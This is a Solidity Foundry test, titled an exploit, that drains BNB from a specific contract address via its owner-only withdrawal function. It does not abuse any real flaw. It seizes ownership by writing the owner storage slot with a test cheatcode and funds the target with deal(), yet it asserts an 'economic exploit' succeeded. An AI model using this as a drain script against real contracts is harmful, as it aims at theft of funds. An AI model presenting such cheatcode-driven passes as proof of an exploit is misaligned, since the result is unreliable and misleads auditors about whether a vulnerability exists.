pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface Engos_0x5548498f6Ae923f590cD1A1cec8D39E1f9363104 {
    function withdrawalBNB(uint _amount, address to) external;
    function owner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function mint(uint256 amount) external;
    function withdrawalToken(address _tokenAddr, uint _amount, address to) external;
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x5548498f6Ae923f590cD1A1cec8D39E1f9363104;
    address attacker = address(this);


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll manipulate storage directly in the exploit
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = address(this).balance;
        // Step 1: Become the owner by overwriting storage slot 0
        // In Ownable, owner is stored at the first storage slot (slot 0)
        bytes32 ownerSlot = bytes32(uint256(0));
        bytes32 newOwner = bytes32(uint256(uint160(attacker)));
        vm.store(TARGET, ownerSlot, newOwner);

        // Step 2: Give the contract some BNB to drain
        // Use deal() to send BNB to the contract
        uint256 contractBalanceBefore = TARGET.balance;
        deal(TARGET, 10 ether); // Give contract 10 ETH/BNB

        // Step 3: Record attacker's balance before the exploit
        uint256 attackerBalanceBefore = attacker.balance;

        // Step 4: Call withdrawalBNB() as owner to drain all BNB
        // We need to impersonate the owner (which is now attacker)
        vm.prank(attacker);
        Engos_0x5548498f6Ae923f590cD1A1cec8D39E1f9363104(TARGET).withdrawalBNB(TARGET.balance, attacker);

        // Step 5: Verify attacker's balance increased
        uint256 attackerBalanceAfter = attacker.balance;
        assertGt(attackerBalanceAfter, attackerBalanceBefore, "Attacker balance should increase");
        uint256 finalBalance = address(this).balance;
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No profit");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

